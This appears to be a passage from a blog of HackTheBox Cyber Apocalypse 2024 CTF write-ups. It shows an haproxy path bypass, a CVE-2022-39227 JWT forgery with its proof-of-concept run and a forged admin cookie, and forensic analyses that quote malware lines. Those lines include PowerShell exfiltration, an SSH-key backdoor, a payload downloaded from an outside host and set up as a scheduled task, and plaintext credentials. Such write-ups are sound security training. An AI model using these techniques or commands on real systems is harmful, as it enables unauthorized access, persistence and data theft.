Reserved.\u0026lt;/p\u0026gt;\\n\u0026lt;/footer\u0026gt;\\n }\\n}\\n\\nfunc GetTestimonials() []string {\\n fsys := os.DirFS(\\\u0026#34;/\\\u0026#34;) \\n files, err := fs.ReadDir(fsys, \\\u0026#34;.\\\u0026#34;) \\n if err != nil {\\n return []string{fmt.Sprintf(\\\u0026#34;Error reading testimonials: %v\\\u0026#34;, err)}\\n }\\n var res []string\\n for _, file := range files {\\n fileContent, _ := fs.ReadFile(fsys, file.Name())\\n res = append(res, string(fileContent)) \\n }\\n return res\\n}\\n\\ntempl Testimonials() {\\n for _, item := range GetTestimonials() {\\n \u0026lt;div class=\\\u0026#34;col-md-4\\\u0026#34;\u0026gt;\\n \u0026lt;div class=\\\u0026#34;card mb-4\\\u0026#34;\u0026gt;\\n \u0026lt;div class=\\\u0026#34;card-body\\\u0026#34;\u0026gt;\\n \u0026lt;p class=\\\u0026#34;card-text\\\u0026#34;\u0026gt;\\\u0026#34;{item}\\\u0026#34;\u0026lt;/p\u0026gt;\\n \u0026lt;p class=\\\u0026#34;text-muted\\\u0026#34;\u0026gt;- Anonymous Testifier\u0026lt;/p\u0026gt;\\n \u0026lt;/div\u0026gt;\\n \u0026lt;/div\u0026gt;\\n \u0026lt;/div\u0026gt;\\n }\\n}\\n\u0026#34; } Now finally, when we return to the page, the flag is indeed accessed!\nHTB{w34kly_t35t3d_t3mplate5}\nLockTalk Difficulty: Medium\nIn \u0026ldquo;The Ransomware Dystopia,\u0026rdquo; LockTalk emerges as a beacon of resistance against the rampant chaos inflicted by ransomware groups. In a world plunged into turmoil by malicious cyber threats, LockTalk stands as a formidable force, dedicated to protecting society from the insidious grip of ransomware. Chosen participants, tasked with representing their districts, navigate a perilous landscape fraught with ethical quandaries and treacherous challenges orchestrated by LockTalk. Their journey intertwines with the organization\u0026rsquo;s mission to neutralize ransomware threats and restore order to a fractured world. As players confront internal struggles and external adversaries, their decisions shape the fate of not only themselves but also their fellow citizens, driving them to unravel the mysteries surrounding LockTalk and choose between succumbing to despair or standing resilient against the encroaching darkness.\nThe first interesting section for this challenge is actually in conf/haproxy.cfg. The conf folder usually has nothing interesting, so it could be easy to overlook completely.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 global daemon maxconn 256 defaults mode http timeout connect 5000ms timeout client 50000ms timeout server 50000ms frontend haproxy bind 0.0.0.0:1337 default_backend backend http-request deny if { path_beg,url_dec -i /api/v1/get_ticket } backend backend balance roundrobin server s1 0.0.0.0:5000 maxconn 32 check We see the proxy denies http requests if the path starts with /api/v1/get_ticket. We will see how this comes into play soon. Visiting the website, we are shown all the available endpoints:\nGetting the flag looks to require a JWT token, and generating a JWT token will result in an error: we are forbidden from visiting, just as defined in the haproxy. However, we have ways around such a restriction. If we were to append something before api, it will not be recognized and blocked. Using a simple . for cwd, we can request the page without traveling. It no longer begins with /api/v1/get_ticket, and so we are able to visit. Most modern browsers will simplify requests and reduce /./ out, but we can use Burpsuite to do this:\nAlternatively, we can use curl with the --path-as-is flag to keep the /./ in the request:\n1 2 $ curl http://83.136.249.253:46008/./api/v1/get_ticket --path-as-is {\u0026#34;ticket: \u0026#34;:\u0026#34;eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAxNjI0MjcsImlhdCI6MTcxMDE1ODgyNywianRpIjoiM2h4Q2wyQXJYdUhxOUxJVnQtTXVmQSIsIm5iZiI6MTcxMDE1ODgyNywicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ.H3vxYVEp-F55Y9jR39ZpJjOBAYgyEReXnovLrDB2tSAFlvW5zifyKnrTF0n29Ck8v_yTmq9w4RgEBoRz4EXZzMeydAK4wVVc9nI3f5p05SG4lRNoVu7b5V0mlLqjjDGDkonyvc7Hveth2WPK0A-0HfjsxbAPHzFy1ZPKXpjHFvOPZXjtUp21JrUtWZlryH77__FCcnTasrGUrj13AhdBWuHXb4xUjDGU_ma-aEbNYW3EO_Uxa16KceP5aHb9ZDmWL4Kjh85Ux82VhX4sqCrVhIx-VhHoif4tDkJ4LF_oDtIm9aOD1x10_qXxZnPtpJMRwU0PeI-Sv02GlvquBHe5WA\u0026#34;} Despite getting a token, guests cannot view flag:\nWe can use a JWT decoder to decode and alter our JWT token:\nThe encryption does not allow us to edit easily. Fortunately, we might find a CVE that highlights a relevant issue. We can send a token as JSON format, including forged content, while providing a valid signature for the untampered token. It will be accepted anyways, and we can access. This CVE was resolved in python-jwt version 3.3.4, so we should check what version this service uses. In the requirements.txt file:\n1 2 3 4 5 $ cat conf/requirements.txt uwsgi Flask requests python_jwt==3.3.3 This is specifically 3.3.3, which means it is very likely the intended method. We can find a POC script for the CVE here.\n1 2 3 4 5 6 $ python3 cve_2022_39227.py -j \u0026#39;eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAxNjI0MjcsImlhdCI6MTcxMDE1ODgyNywianRpIjoiM2h4Q2wyQXJYdUhxOUxJVnQtTXVmQSIsIm5iZiI6MTcxMDE1ODgyNywicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ.H3vxYVEp-F55Y9jR39ZpJjOBAYgyEReXnovLrDB2tSAFlvW5zifyKnrTF0n29Ck8v_yTmq9w4RgEBoRz4EXZzMeydAK4wVVc9nI3f5p05SG4lRNoVu7b5V0mlLqjjDGDkonyvc7Hveth2WPK0A-0HfjsxbAPHzFy1ZPKXpjHFvOPZXjtUp21JrUtWZlryH77__FCcnTasrGUrj13AhdBWuHXb4xUjDGU_ma-aEbNYW3EO_Uxa16KceP5aHb9ZDmWL4Kjh85Ux82VhX4sqCrVhIx-VhHoif4tDkJ4LF_oDtIm9aOD1x10_qXxZnPtpJMRwU0PeI-Sv02GlvquBHe5WA\u0026#39; -i \u0026#39;role=administrator\u0026#39; [+] Retrieved base64 encoded payload: eyJleHAiOjE3MTAxNjI0MjcsImlhdCI6MTcxMDE1ODgyNywianRpIjoiM2h4Q2wyQXJYdUhxOUxJVnQtTXVmQSIsIm5iZiI6MTcxMDE1ODgyNywicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ \u0026lt;...SNIP...\u0026gt; Example (HTTP-Cookie): ------------------------------ auth={\u0026#34; eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAxNjI0MjcsImlhdCI6MTcxMDE1ODgyNywianRpIjoiM2h4Q2wyQXJYdUhxOUxJVnQtTXVmQSIsIm5iZiI6MTcxMDE1ODgyNywicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoiZ3Vlc3RfdXNlciJ9.\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;protected\u0026#34;:\u0026#34;eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9\u0026#34;, \u0026#34;payload\u0026#34;:\u0026#34;eyJleHAiOjE3MTAxNjI0MjcsImlhdCI6MTcxMDE1ODgyNywianRpIjoiM2h4Q2wyQXJYdUhxOUxJVnQtTXVmQSIsIm5iZiI6MTcxMDE1ODgyNywicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ\u0026#34;,\u0026#34;signature\u0026#34;:\u0026#34;H3vxYVEp-F55Y9jR39ZpJjOBAYgyEReXnovLrDB2tSAFlvW5zifyKnrTF0n29Ck8v_yTmq9w4RgEBoRz4EXZzMeydAK4wVVc9nI3f5p05SG4lRNoVu7b5V0mlLqjjDGDkonyvc7Hveth2WPK0A-0HfjsxbAPHzFy1ZPKXpjHFvOPZXjtUp21JrUtWZlryH77__FCcnTasrGUrj13AhdBWuHXb4xUjDGU_ma-aEbNYW3EO_Uxa16KceP5aHb9ZDmWL4Kjh85Ux82VhX4sqCrVhIx-VhHoif4tDkJ4LF_oDtIm9aOD1x10_qXxZnPtpJMRwU0PeI-Sv02GlvquBHe5WA\u0026#34;} The output is a little messy because the token is fat, but the way to use is -j flag to define your valid cookie, then -i flag to supply the tampered information. Here is set role as administrator, and note that unlike the cookie format, I supply as \u0026lt;KEY\u0026gt;=\u0026lt;VALUE\u0026gt;.\nNow when we supply the token (including braces and quotes), we receive the flag! HTB{h4Pr0Xy_n3v3r_D1s@pp01n4s}\nForensics Urgent Difficulty: Very Easy\nIn the midst of Cybercity\u0026rsquo;s \u0026ldquo;Fray,\u0026rdquo; a phishing attack targets its factions, sparking chaos. As they decode the email, cyber sleuths race to trace its source, under a tight deadline. Their mission: unmask the attacker and restore order to the city. In the neon-lit streets, the battle for cyber justice unfolds, determining the factions\u0026rsquo; destiny.\nIn the supplied email, we see a base64 encoded attachment named \u0026ldquo;onlineform.html\u0026rdquo;. Using base64, i decode this through an echo:\n1 2 3 4 5 6 7 8 9 10 11 12 13 echo \u0026#39;PGh0bWw+DQo8aGVhZD4NCjx0aXRsZT48L3RpdGxlPg0KPGJvZHk+DQo8c2NyaXB0IGxhbmd1YWdl \u0026lt;...SNIP...\u0026gt;\u0026#39; | base64 -d \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;\u0026lt;/title\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script language=\u0026#34;JavaScript\u0026#34; type=\u0026#34;text/javascript\u0026#34;\u0026gt; document.write(unescape(\u0026#39;%3c%68%74%6d%6c%3e%0d%0a%3c \u0026lt;...SNIP...\u0026gt; %65%61%64%3e%0d%0a%3c%2f%68%74%6d%6c%3e%0d%0a\u0026#39;)); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; We can see another large amount of characters displayed as \u0026ldquo;text/javascript\u0026rdquo;. Based on the regular intervals of %, this is clearly URL encoded. Going to cyberchef, we can decode this very simply. Within the decoded contents, we can find our flag:\nHTB{4n0th3r_d4y_4n0th3r_ph1shi1ng_4tt3mpT}\nAn Unusual Sighting Difficulty: Very Easy\nAs the preparations come to an end, and The Fray draws near each day, our newly established team has started work on refactoring the new CMS application for the competition. However, after some time we noticed that a lot of our work mysteriously has been disappearing! We managed to extract the SSH Logs and the Bash History from our dev server in question. The faction that manages to uncover the perpetrator will have a massive bonus come competition!\nThe work involves a bash log and ssh server log. Looking at the files, we gather data and answer questions presented through a docker ncat instance. Here is the series of questions with answers:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 Note 2: All timestamps are in the format they appear in the logs What is the IP Address and Port of the SSH Server (IP:PORT) \u0026gt; 100.107.36.130:2221 [+] Correct! What time is the first successful Login \u0026gt; 2024-02-13 11:29:50 [+] Correct! What is the time of the unusual Login \u0026gt; 2024-02-19 04:00:14 [+] Correct! What is the Fingerprint of the attacker\u0026#39;s public key \u0026gt; OPkBSs6okUKraq8pYo4XwwBg55QSo210F09FCe1-yj4 [+] Correct! What is the first command the attacker executed after logging in \u0026gt; whoami [+] Correct! What is the final command the attacker executed before logging out \u0026gt; ./setup [+] Correct! [+] Here is the flag: HTB{B3sT_0f_luck_1n_th3_Fr4y!!} What is the IP Address and Port of the SSH Server (IP:PORT) Answer: 1 2 3 4 $ head sshd.log [2024-01-19 12:59:11] Server listening on 0.0.0.0 port 2221. [2024-01-19 12:59:11] Server listening on :: port 2221. [2024-01-28 15:24:23] Connection from 100.72.1.95 port 47721 on 100.107.36.130 port 2221 rdomain \u0026#34;\u0026#34; Listening on port 2221, and IP address is disclosed on the first connection log\nWhat time is the first successful Login Answer: 1 2 3 4 $ grep \u0026#34;Accepted\u0026#34; sshd.log [2024-02-13 11:29:50] Accepted password for root from 100.81.51.199 port 63172 ssh2 [2024-02-15 10:40:50] Accepted password for softdev from 101.111.18.92 port 44711 ssh2 [2024-02-15 18:51:50] Accepted password for softdev from 101.111.18.92 port 44711 ssh2 1st time stamp is the first successful login. 3. What is the time of the unusual Login Answer:\n1 2 3 4 5 $ grep \u0026#34;Accepted\u0026#34; sshd.log \u0026lt;...SNIP...\u0026gt; [2024-02-19 04:00:14] Accepted password for root from 2.67.182.119 port 60071 ssh2 [2024-02-20 11:10:14] Accepted password for softdev from 100.87.190.253 port 63371 ssh2 [2024-02-21 10:49:50] Accepted password for softdev from 102.11.76.9 port 48875 ssh2 Further down, we see a successful login coming from a strange port 2.67.182.119 (abnormal time of day as well) 4. What is the Fingerprint of the attacker\u0026rsquo;s public key Answer:\n1 2 3 $ grep \u0026#39;2.67.182.119\u0026#39; sshd.log [2024-02-19 04:00:14] Connection from 2.67.182.119 port 60071 on 100.107.36.130 port 2221 rdomain \u0026#34;\u0026#34; [2024-02-19 04:00:14] Failed publickey for root from 2.67.182.119 port 60071 ssh2: ECDSA SHA256:OPkBSs6okUKraq8pYo4XwwBg55QSo210F09FCe1-yj4 When filtering by the abnormal IP address, we can see the publickey is also reported as irregular. 5. What is the first command the attacker executed after logging in\n1 2 3 $ grep \u0026#34;2024-02-19 04\u0026#34; bash_history.txt [2024-02-19 04:00:18] whoami [2024-02-19 04:00:20] uname -a Check bash_history at the same day and hour of suspicious login activity 6. What is the final command the attacker executed before logging out\n1 2 3 4 5 $ grep \u0026#34;2024-02-19 04\u0026#34; bash_history.txt [2024-02-19 04:00:18] whoami \u0026lt;...SNIP...\u0026gt; [2024-02-19 04:12:02] shred -zu latest.tar.gz [2024-02-19 04:14:02] ./setup This is the last command of the hour. If we review the bash_history directly, we can see the next command isn\u0026rsquo;t logged for more than 24 hours later:\n1 2 3 [2024-02-19 04:12:02] shred -zu latest.tar.gz [2024-02-19 04:14:02] ./setup [2024-02-20 11:11:14] nvim server.py Fake Boost Difficulty: Easy\nIn the shadow of The Fray, a new test called \u0026ldquo;\u0026ldquo;Fake Boost\u0026rdquo;\u0026rdquo; whispers promises of free Discord Nitro perks. It\u0026rsquo;s a trap, set in a world where nothing comes without a cost. As factions clash and alliances shift, the truth behind Fake Boost could be the key to survival or downfall. Will your faction see through the deception? KORP™ challenges you to discern reality from illusion in this cunning trial.\nBy sorting for tcp, we can quickly identify a GET request on a very suspicious /freediscordnitro:\nWhen we right click -\u0026gt; follow http stream, we can view the request/response contents as a whole, and it contains a very large string of what appears to be base64 encoded characters:\nAt the bottom, we can get hints as to the encoding method for this. First we see a Reverse, followed by convert from base64:\nUsing cyberchef, we can transform this query very easily:\nWithin the script, we can find a variable part1 being defined without being used anywhere else:\nWhen we base64 decode this, we can see it is part of the flag:\n1 2 echo \u0026#39;SFRCe2ZyMzNfTjE3cjBHM25fM3hwMDUzZCFf\u0026#39; | base64 -d HTB{fr33_N17r0G3n_3xp053d!_ Back to wireshark, we can also see the data exfiltration event by filtering on http:\nWe need to go back to the cyberchef decoded payload, but we can see clearly (with the AES key) how the data is transformed:\n1 2 3 4 5 6 7 8 9 10 11 $AES_KEY = \u0026#34;Y1dwaHJOVGs5d2dXWjkzdDE5amF5cW5sYUR1SWVGS2k=\u0026#34; $payload = $userInfos | ConvertTo-Json -Depth 10 $encryptedData = Encrypt-String -key $AES_KEY -plaintext $payload try { $headers = @{ \u0026#39;Content-Type\u0026#39; = \u0026#39;text/plain\u0026#39; \u0026#39;User-Agent\u0026#39; = \u0026#39;Mozilla/5.0\u0026#39; } Invoke-RestMethod -Uri $URL -Method Post -Headers $headers -Body $encryptedData } Here is the AES key hardcoded from the previous message. Now we can decode the exfiltrated data:\nAs for the IV, it is supplied at the beginning of the message encased in red box. Within the decoded JSON, we can see an email field strangely encoded. When we decode with base64, we see the 2nd part of the flag!\n1 2 echo \u0026#39;YjNXNHIzXzBmX1QwMF9nMDBkXzJfYjNfN3J1M18wZmYzcjV9\u0026#39; | base64 -d b3W4r3_0f_T00_g00d_2_b3_7ru3_0ff3r5} The full flag: HTB{fr33_N17r0G3n_3xp053d!_b3W4r3_0f_T00_g00d_2_b3_7ru3_0ff3r5}\nPhreaky Difficulty: Medium\nIn the shadowed realm where the Phreaks hold sway,\nA mole lurks within, leading them astray.\nSending keys to the Talents, so sly and so slick,\nA network packet capture must reveal the trick.\nThrough data and bytes, the sleuth seeks the sign,\nDecrypting messages, crossing the line.\nThe traitor unveiled, with nowhere to hide,\nBetrayal confirmed, they\u0026rsquo;d no longer abide.\nWe are given a pcap file once again. This time there is no real interesting TCP requests, but we might quickly find unencrypted email transmissions:\nWhen we follow the content, we can see a base64 encoded attachment. Here we might want to read the message before jumping straight into it:\nIt describes this attachment as \u0026ldquo;part of the file\u0026rdquo; and supplies a password as well. With a name like efcfd.zip, we can pretty easily guess the process: First we base64 decode, then unzip with the supplied password. There are several emails relevant to this challenge, so we can use \u0026ldquo;Export Object\u0026rdquo; to grab them all:\nFrom here we see 15 different email messages:\nAfter saving all, we need to extract the b64 and unzip using the password.\neventually, we are left with 15 pdf part files:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 -rw-rw-r-- 1 spencer spencer 221 Mar 6 09:59 phreaks_plan.pdf.part10 -rw-rw-r-- 1 spencer spencer 221 Mar 6 09:59 phreaks_plan.pdf.part11 -rw-rw-r-- 1 spencer spencer 221 Mar 6 09:59 phreaks_plan.pdf.part12 -rw-rw-r-- 1 spencer spencer 221 Mar 6 09:59 phreaks_plan.pdf.part13 -rw-rw-r-- 1 spencer spencer 221 Mar 6 09:59 phreaks_plan.pdf.part14 -rw-rw-r-- 1 spencer spencer 208 Mar 6 09:59 phreaks_plan.pdf.part15 -rw-rw-r-- 1 spencer spencer 221 Mar 6 09:59 phreaks_plan.pdf.part1 -rw-rw-r-- 1 spencer spencer 221 Mar 6 09:59 phreaks_plan.pdf.part2 -rw-rw-r-- 1 spencer spencer 221 Mar 6 09:59 phreaks_plan.pdf.part3 -rw-rw-r-- 1 spencer spencer 221 Mar 6 09:59 phreaks_plan.pdf.part4 -rw-rw-r-- 1 spencer spencer 221 Mar 6 09:59 phreaks_plan.pdf.part5 -rw-rw-r-- 1 spencer spencer 221 Mar 6 09:59 phreaks_plan.pdf.part6 -rw-rw-r-- 1 spencer spencer 221 Mar 6 09:59 phreaks_plan.pdf.part7 -rw-rw-r-- 1 spencer spencer 221 Mar 6 09:59 phreaks_plan.pdf.part8 -rw-rw-r-- 1 spencer spencer 221 Mar 6 09:59 phreaks_plan.pdf.part9 Now we need to reconstruct the pdf. Unfortunately, simply doing cat phreaks_plan* \u0026gt; plan.pdf will append out of order, so I had to cat them one by one:\n1 2 3 4 5 cat phreaks_plan.pdf.part0 cat phreaks_plan.pdf.part1 \u0026gt; plan1.pdf cat phreaks_plan.pdf.part2 \u0026gt;\u0026gt; plan1.pdf cat phreaks_plan.pdf.part3 \u0026gt;\u0026gt; plan1.pdf cat phreaks_plan.pdf.part4 \u0026gt;\u0026gt; plan1.pdf And so on.. Eventually we can view, the pdf, which contains the flag at the end:\nHTB{Th3Phr3aksReadyT0Att4ck}\nData Siege Difficulty: Medium\n\u0026ldquo;It was a tranquil night in the Phreaks headquarters, when the entire district erupted in chaos. Unknown assailants, rumored to be a rogue foreign faction, have infiltrated the city\u0026rsquo;s messaging system and critical infrastructure. Garbled transmissions crackle through the airwaves, spewing misinformation and disrupting communication channels. We need to understand which data has been obtained from this attack to reclaim control of the and communication backbone. Note: flag is splitted in three parts.\u0026rdquo;\nYet another pcap file. The first thing I come across is an interesting Invoke-WebRequest:\nThis is part of the webpage response, however it looks to be contained in XML formatting. Perhaps it is something that was executed on our victim? If aQ4caZ.exe was indeed downloaded we should be able to export this object.\nWe do see it here, and as a 29kb file it looks to be fully formed. We don\u0026rsquo;t want to run random executables that we find, but we do need to analyze this. Firstly checking strings:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 $ strings aQ4caZ.exe !This program cannot be run in DOS mode. .text `.rsrc \u0026lt;...SNIP...\u0026gt; EZRATClient Copyright 2019 $2a079f4e-4dcc-44db-8ca1-0cf2c6a5f41d 0.1.6.1 .NETFramework,Version=v4.8 FrameworkDisplayName .NET Framework 4.8 lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet PADPADP RSDS C:\\Users\\User\\Downloads\\EZRAT\\EZRATClient\\obj\\Debug\\EZRATClient.pdb _CorExeMain mscoree.dll Very_S3cr3t_S \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; standalone=\u0026#34;yes\u0026#34;?\u0026gt; \u0026lt;assembly xmlns=\u0026#34;urn:schemas-microsoft-com:asm.v1\u0026#34; manifestVersion=\u0026#34;1.0\u0026#34;\u0026gt; \u0026lt;assemblyIdentity version=\u0026#34;1.0.0.0\u0026#34; name=\u0026#34;MyApplication.app\u0026#34;/\u0026gt; \u0026lt;trustInfo xmlns=\u0026#34;urn:schemas-microsoft-com:asm.v2\u0026#34;\u0026gt; \u0026lt;security\u0026gt; \u0026lt;requestedPrivileges xmlns=\u0026#34;urn:schemas-microsoft-com:asm.v3\u0026#34;\u0026gt; \u0026lt;requestedExecutionLevel level=\u0026#34;asInvoker\u0026#34; uiAccess=\u0026#34;false\u0026#34;/\u0026gt; \u0026lt;/requestedPrivileges\u0026gt; \u0026lt;/security\u0026gt; \u0026lt;/trustInfo\u0026gt; \u0026lt;/assembly\u0026gt; We can see this looks like a fully functioning executable, and I notice the phrase EZRATClient thrown around several times. We certainly don\u0026rsquo;t want to be launching RATs onto our system! While I wasn\u0026rsquo;t able to pull out a flag string directly, we can see in this snippet a very interesting string: Very_S3cr3t_S. This looks like a section of the flag, but it is clearly not in it\u0026rsquo;s final form.\nWith the executable file, I turn to dnSpy for further analysis. Within the EZRATClient.Utils contents, we can see a private encryption key:\nVYAemVeO3zUDTL6N62kVA\nThe next interesting piece is we can find a Decrypt function:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 public static string Decrypt(string cipherText) { string text; try { string encryptKey = Constantes.EncryptKey; byte[] array = Convert.FromBase64String(cipherText); using (Aes aes = Aes.Create()) { Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(encryptKey, new byte[] { 86, 101, 114, 121, 95, 83, 51, 99, 114, 51, 116, 95, 83 }); aes.Key = rfc2898DeriveBytes.GetBytes(32); aes.IV = rfc2898DeriveBytes.GetBytes(16); using (MemoryStream memoryStream = new MemoryStream()) { using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Write)) { cryptoStream.Write(array, 0, array.Length); cryptoStream.Close(); } cipherText = Encoding.Default.GetString(memoryStream.ToArray()); } } text = cipherText; } catch (Exception ex) { Console.WriteLine(ex.Message); Console.WriteLine(\u0026#34;Cipher Text: \u0026#34; + cipherText); text = \u0026#34;error\u0026#34;; } return text; } Side note, translating the array 86,101,114,121,95,83,51,99,114,51,116,95,83 from decimal yields Very_S3cr3t_S, our interesting string from earlier.\nReturning to the wireshark, there was another TCP string that looked like a lot of encrypted junk. Now that we know how to decrypt, we can revisit:\nTo make my life \u0026ldquo;easier\u0026rdquo; with the decrypt function, I asked ChatGPT to generate a python script for me. It only took 2 hours of collaborating before I got something that worked. The barely working script only translates 1 message at a time, so I number the important messages and the translated data:\nDecrypted Message 1: 1 Decrypted Text: cmd;C:\\;echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwyPZCQyJ/s45lt+cRqPhJj5qrSqd8cvhUaDhwsAemRey2r7Ta+wLtkWZobVIFS4HGzRobAw9s3hmFaCKI8GvfgMsxDSmb0bZcAAkl7cMzhA1F418CLlghANAPFM6Aud7DlJZUtJnN2BiTqbrjPmBuTKeBxjtI0uRTXt4JvpDKx9aCMNEDKGcKVz0KX/hejjR/Xy0nJxHWKgudEz3je31cVow6kKqp3ZUxzZz9BQlxU5kRp4yhUUxo3Fbomo6IsmBydqQdB+LbHGURUFLYWlWEy+1otr6JBwpAfzwZOYVEfLypl3Sjg+S6Fd1cH6jBJp/mG2R2zqCKt3jaWH5SJz13 HTB{c0mmun1c4710n5 \u0026gt;\u0026gt; C:\\Users\\svc01\\.ssh\\authorized_keys Decrypted Message 2: 1 2 3 4 Decrypted Text: cmd;C:\\;Username: svc01 Password: Passw0rdCorp5421 2nd flag part: _h45_b33n_r357 Decrypted Message 3: 1 2 3 4 5 6 7 8 9 10 11 (New-Object System.Net.WebClient).DownloadFile(\u0026#34;https://windowsliveupdater.com/4fva.exe\u0026#34;, \u0026#34;C:\\Users\\svc01\\AppData\\Roaming\\4fva.exe\u0026#34;) $action = New-ScheduledTaskAction -Execute \u0026#34;C:\\Users\\svc01\\AppData\\Roaming\\4fva.exe\u0026#34; $trigger = New-ScheduledTaskTrigger -Daily -At 2:00AM $settings = New-ScheduledTaskSettingsSet # 3th flag part: Register-ScheduledTask -TaskName \u0026#34;0r3d_1n_7h3_h34dqu4r73r5}\u0026#34; -Action $action -Trigger $trigger -Settings $settings Note that 3 is just a base64 encoded powershell command, so all that is needed is base64 conversion. Finally we can combine the flag: HTB{c0mmun1c4710n5_h45_b33n_r3570r3d_1n_7h3_h34dqu4r73r5}\nPython decryption script:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 import base64 from Crypto.Cipher import AES from Crypto.Protocol.KDF import PBKDF2 import sys # Function to decrypt data def decrypt(cipher_text, encrypt_key): try: salt = b\u0026#39;Very_S3cr3t_S\u0026#39; # Salt used for key derivation iv_length = 16 # IV length key_length = 32 # Key length # Derive key and IV using PBKDF2 key_iv = PBKDF2(encrypt_key, salt, dkLen=key_length + iv_length, count=1000) # Extract key and IV aes_key = key_iv[:key_length] iv = key_iv[key_length:] # Create AES cipher object cipher = AES.new(aes_key, AES.MODE_CBC, iv) # Decode base64 encoded cipher text encrypted_data = base64.b64decode(cipher_text) # Decrypt the data decrypted_data = cipher.decrypt(encrypted_data) # Unpad the decrypted data (if padding was used) decrypted_data = unpad(decrypted_data) # Convert decrypted data to string using \u0026#39;latin-1\u0026#39; encoding text = decrypted_data.decode(\u0026#39;latin-1\u0026#39;) except Exception as ex: print(ex) print(\u0026#34;Cipher Text:\u0026#34;, cipher_text) text = \u0026#34;error\u0026#34; return text # Function to unpad data def unpad(s): return s[:-ord(s[len(s)-1:])] # Read cipher text from file cipher_text_file = \u0026#34;cipher_text.txt\u0026#34; # Change to the path of your ciphertext file with open(cipher_text_file, \u0026#39;r\u0026#39;) as file: cipher_text = file.read() encrypt_key = \u0026#34;VYAemVeO3zUDTL6N62kVA\u0026#34; decrypted_text = decrypt(cipher_text, encrypt_key) print(\u0026#34;Decrypted Text:\u0026#34;, decrypted_text) ","date":"2024-03-16T13:16:33-05:00","image":"https://yuwenmichael.netlify.app/post/hackthebox-cyber-apocalypse-2024/ca-2024-ctf-background_hu79fb911f15dc293e846234ec3fd7f755_277232_120x120_fill_q75_box_smart1.jpg","permalink":"https://yuwenmichael.netlify.app/post/hackthebox-cyber-apocalypse-2024/","title":"HackTheBox - Cyber Apocalypse: 2024"},{"content":"Enumeration Initial nmap:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 Nmap scan report for 10.10.11.236 Host is up (0.047s latency). Not shown: 987 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-title: Manager |_http-server-header: Microsoft-IIS/10.0 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-10-23 06:29:34Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=dc01.manager.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:dc01.manager.htb | Not valid before: 2023-07-30T13:51:28 |_Not valid after: 2024-07-29T13:51:28 |_ssl-date: 2023-10-23T06:30:56+00:00; +6h59m59s from scanner time. 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name) |_ssl-date: 2023-10-23T06:30:56+00:00; +7h00m00s from scanner time. | ssl-cert: Subject: commonName=dc01.manager.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:dc01.manager.htb | Not valid before: 2023-07-30T13:51:28 |_Not valid after: 2024-07-29T13:51:28 1433/tcp open ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM | ms-sql-ntlm-info: | 10.10.11.236:1433: | Target_Name: MANAGER | NetBIOS_Domain_Name: MANAGER | NetBIOS_Computer_Name: DC01 | DNS_Domain_Name: manager.htb | DNS_Computer_Name: dc01.manager.htb | DNS_Tree_Name: manager.htb |_ Product_Version: 10.0.17763 |_ssl-date: 2023-10-23T06:30:55+00:00; +6h59m59s from scanner time. | ms-sql-info: | 10.10.11.236:1433: | Version: | name: Microsoft SQL Server 2019 RTM | number: 15.00.2000.00 | Product: Microsoft SQL Server 2019 | Service pack level: RTM | Post-SP patches applied: false |_ TCP port: 1433 